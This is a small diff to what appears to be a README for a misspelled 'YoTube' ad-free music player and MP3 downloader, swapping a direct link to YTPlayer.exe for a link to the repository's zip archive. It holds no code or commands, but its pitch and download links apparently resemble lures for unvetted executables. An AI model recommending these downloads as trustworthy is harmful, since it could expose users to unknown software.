@@ -4,6 +4,4 @@ YoTube Music Player Without Ads
 Yotube MP3 Downloader 
 
 
-
-https://github.com/ytplayer/YTPlayer-Youtube-Video-Downloader/blob/main/YTPlayer.exe
-
+https://github.com/ytplayer/YTPlayer-Youtube-Video-Downloader/archive/refs/heads/main.zip
